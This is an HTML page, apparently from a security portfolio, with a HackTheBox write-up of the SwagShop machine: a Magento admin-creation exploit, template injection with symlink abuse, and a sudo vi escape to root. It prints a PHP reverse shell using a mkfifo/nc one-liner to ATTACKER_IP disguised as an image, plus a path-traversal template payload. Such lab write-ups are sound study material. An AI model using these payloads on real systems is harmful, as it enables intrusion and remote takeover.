@@ -1,0 +1,256 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - SwagShop</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>SwagShop (HTB – Easy)</h1>
+
+<p>
+SwagShop runs an outdated Magento e‑commerce platform vulnerable to multiple public exploits.  
+The initial foothold is obtained by creating an admin user through a known Magento RCE.  
+From the admin panel, template injection and symlink abuse allow uploading a PHP reverse shell.  
+Privilege escalation is achieved through a sudo‑allowed <code>vi</code> binary.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: swagshop.htb  
+<br>Initial vector: Magento RCE → admin account creation  
+<br>Privilege escalation: sudo vi → root shell  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+22/tcp ssh
+80/tcp http (Apache 2.4.18)
+</pre>
+
+<p>
+The site redirects to:
+</p>
+
+<pre>
+http://swagshop.htb
+</pre>
+
+<p>
+Wappalyzer / WhatWeb identify the CMS as:
+</p>
+
+<pre>
+Magento
+</pre>
+
+<h2>Foothold – Magento RCE (CVE‑2015‑1397 / 37977)</h2>
+
+<p>
+Searchsploit reveals a Python exploit that creates a new Magento admin user:
+</p>
+
+<pre>
+$ searchsploit magento
+-> 37977.py
+</pre>
+
+<p>
+Modify the exploit to set your own username and password, then run it:
+</p>
+
+<pre>
+$ python3 magento_rce.py
+</pre>
+
+<p>
+Login to the Magento admin panel:
+</p>
+
+<pre>
+http://swagshop.htb/index.php/admin
+</pre>
+
+<h2>Template Injection → File Upload → Reverse Shell</h2>
+
+<p>
+Enable symlinks (required for the Froghopper attack):</p>
+
+<ol>
+  <li>System → Configuration</li>
+  <li>Developer → Template Settings</li>
+  <li>Allow Symlinks: YES</li>
+</ol>
+
+<p>
+Next, upload a malicious template file.  
+Create a PHP reverse shell disguised as an image:
+</p>
+
+<pre>
+<?php
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f");
+?>
+</pre>
+
+<p>
+Save it as <code>kacked.php.png</code> and upload it under:
+</p>
+
+<pre>
+Catalog → Manage Categories → Add Image
+</pre>
+
+<p>
+Copy the uploaded file’s URL (hover to reveal the path).</p>
+
+<h3>Triggering the Payload</h3>
+
+<p>
+Go to:
+</p>
+
+<pre>
+Newsletter → Newsletter Templates → Add New Template
+</pre>
+
+<p>
+Insert the following template injection payload:
+</p>
+
+<pre>
+{{block type="core/template" template="../../../../../../<path-to-uploaded-file>"}}
+</pre>
+
+<p>
+Save → Preview Template.  
+With a listener running:
+</p>
+
+<pre>
+$ nc -nlvp 443
+</pre>
+
+<p>
+A shell is obtained as <code>www-data</code>.
+</p>
+
+<h2>Privilege Escalation</h2>
+
+<p>
+Check sudo permissions:
+</p>
+
+<pre>
+$ sudo -l
+-> (root) NOPASSWD: /usr/bin/vi /var/www/html/gothacked
+</pre>
+
+<p>
+Use <code>vi</code> to escape to a root shell:
+</p>
+
+<pre>
+$ sudo vi /var/www/html/gothacked
+</pre>
+
+<p>Inside vi:</p>
+
+<pre>
+:set shell=/bin/bash
+:shell
+</pre>
+
+<p>
+Root access obtained.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+SwagShop demonstrates a classic Magento exploitation chain: create an admin user via RCE, abuse template
+injection to upload a reverse shell, and escalate privileges using a sudo‑allowed <code>vi</code> binary.  
+A straightforward but satisfying exploitation path.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
